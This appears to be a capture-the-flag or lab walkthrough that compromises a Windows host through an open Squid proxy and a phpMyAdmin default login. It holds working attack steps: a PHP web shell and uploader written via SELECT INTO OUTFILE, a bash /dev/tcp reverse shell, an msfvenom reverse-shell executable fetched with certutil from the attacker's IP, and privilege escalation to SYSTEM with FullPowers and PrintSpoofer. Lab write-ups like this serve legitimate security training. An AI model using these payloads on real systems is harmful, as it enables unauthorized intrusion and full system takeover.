## Initial Foothold

Autorecon `http://192.168.228.189`
```
PORT      STATE SERVICE       REASON          VERSION
135/tcp   open  msrpc?        syn-ack ttl 125
139/tcp   open  netbios-ssn?  syn-ack ttl 125
445/tcp   open  microsoft-ds? syn-ack ttl 125
3128/tcp  open  squid-http?   syn-ack ttl 125
49666/tcp open  unknown       syn-ack ttl 125
49667/tcp open  unknown       syn-ack ttl 125
1 service unrecognized despite returning data.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2019 (92%), Microsoft Windows 10 1903 - 22H2 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
```
Ports
- 135 (rpc) - `rpcclient -U '' -N http://192.168.228.189`. Cannot connect.
- 139/445 (smb) - smb anonymous access declined. Enum4linux did not return users. DNS domain and FQDN is named SQUID
- 3128 (web) - brings us to squid error page. Squid version is 4.14.
```
Squid is a caching proxy for the Web supporting HTTP, HTTPS, FTP, and more. It reduces bandwidth and improves response times by caching and reusing frequently-requested web pages. Squid has extensive access controls and makes a great server accelerator. It runs on most available operating systems, including Windows and is licensed under the GNU GPL.
```

`https://book.hacktricks.xyz/network-services-pentesting/3128-pentesting-squid`
From hacktricks, we can test the proxy like so.
`curl --proxy http://10.10.11.131:3128 http://10.10.11.131`. Use a script like this to iterate through the ports.
```
#!/bin/bash  
  
# Proxy details  
proxy_address="192.168.x.x"  
proxy_port="3128"  
  
# Target IP and ports  
target_ip="192.168.x.x"  
ports=("80" "443" "8000" "8080") #Feel free to add additional ports in the same format  
  
# Loop over ports  
for port in "${ports[@]}"; do  
    # Make a request using curl with the proxy, and save the response and status code  
    response=$(curl -s -o /dev/null -w "%{http_code}" --proxy $proxy_address:$proxy_port $target_ip:$port)  
  
    # Check if the status code is 200  
    if [ "$response" -eq 200 ]; then  
        echo "Response from $target_ip:$port with status code $response"  
    fi  
done
```

```
┌──(kali㉿kali)-[~/offsec/squid]
└─$ ./proxy-curl.sh        
Response from 192.168.207.189:8080 with status code 200
```

Download foxyproxy if you havent. Go click on foxyproxy -> options -> proxies ->
add -> Fill in Title, Type, Hostname (IP address), Port, and then Save.

Turn on squid proxy and head to `http://192.168.207.189:8080/`. We are greeted by Wampserver. Click on phpmyadmin. Also click on phpinfo.

Try credentials like `admin:admin`and `root:root` but the default credentials for phpmyadmin is `root:` which worked. 
From phpinfo we note that.
```
DOCUMENT_ROOT 	C:/wamp/www 
CONTEXT_DOCUMENT_ROOT 	C:/wamp/www 
```
This suggest that our SQL statement to use should include this directory
```
SELECT "<?php echo shell_exec($_GET['cmd']); ?>" into outfile "/wamp/www/shell.php" 
```
Test out to see if it works. And it does.
```
http://192.168.207.189:8080/shell.php?cmd=whoami
nt authority\local service 
```

Cook up a revshell on revshells.com
```
/bin/sh -i >& /dev/tcp/192.168.45.212/3128 0>&1
%2Fbin%2Fsh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.212%2F3128%200%3E%261
```

Ok nevermind I just realised this is a windows box. Cook up a payload.exe.
```
┌──(kali㉿kali)-[~/offsec/squid]
└─$ msfvenom -p windows/x64/shell_reverse_tcp -f exe -o payload.exe LHOST=192.168.45.212 LPORT=3128
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7680 bytes
Saved as: payload.exe
┌──(kali㉿kali)-[~/offsec/squid]
└─$ python -m http.server 80


## Go to firefox
## command we are using
certutil -urlcache -split -f http://192.168.45.212/payload.exe payload.exe

http://192.168.207.189:8080/shell.php?cmd=certutil%20-urlcache%20-split%20-f%20http%3A%2F%2F192.168.45.212%2Fpayload.exe%20payload.exe
```

Something to note:
`./payload.exe` is Unix syntax — but this is a Windows payload
You built `windows/x64/shell_reverse_tcp`, so the target is Windows and `shell.php` is handing your command to `cmd.exe`. `cmd.exe` doesn't understand `./`. Drop it:
```
http://192.168.207.189:8080/shell.php?cmd=payload.exe
```
Shell caught on penelope port 3128.

## Alternative:

We will create a new file called uploader.php in the root web directory that allows us to upload a shell.

Go to the SQL Tab and insert this code:
```
SELECT   
"<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>"  
INTO OUTFILE 'C:/wamp/www/uploader.php';
```
Now we can upload the shell of our choice. Ivan Sincek version. Go to 
```
http://192.168.207.189:8080/php-reverse-shell.php
```

## Privesc

whoami /all
```
USER INFORMATION
----------------

User Name                  SID     
========================== ========
nt authority\local service S-1-5-19


GROUP INFORMATION
-----------------
...
...

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeCreateGlobalPrivilege       Create global objects          Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

Ran winpeas.sh. Nothing too suspicious.

After a lengthy amount of enumeration, I could not find any privileged services that could lead to a local privilege escalation.
The author has developed a local exploit that will streamline the process of regaining all of the privileges that service accounts used to come with.
https://github.com/itm4n/FullPowers
**This tool should be executed as `LOCAL SERVICE` or `NETWORK SERVICE` only.**

**Tried using it in powershell and it did not work**. This only works in cmd.
```
C:\UseFullPowblic\Documents>cd Users
FullPowers
[+] Started dummy thread with id 4232
[+] Successfully created scheduled task.
[+] Got new token! Privilege count: 7
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.17763.2300]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State  
============================= ========================================= =======
SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
SeAuditPrivilege              Generate security audits                  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
```

Upload printspoofer and get nt authority. 
```
C:\Users\Public\Documents>certutil -urlcache -split -f http://192.168.45.212/PrintSpoofer64.exe PrintSpoofer64.exe
certutil -urlcache -split -f http://192.168.45.212/PrintSpoofer64.exe PrintSpoofer64.exe
****  Online  ****
  0000  ...
  6a00
CertUtil: -URLCache command completed successfully.

C:\Users\Public\Documents>PrintSpoofer64.exe -i -c cmd
PrintSpoofer64.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.17763.2300]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```
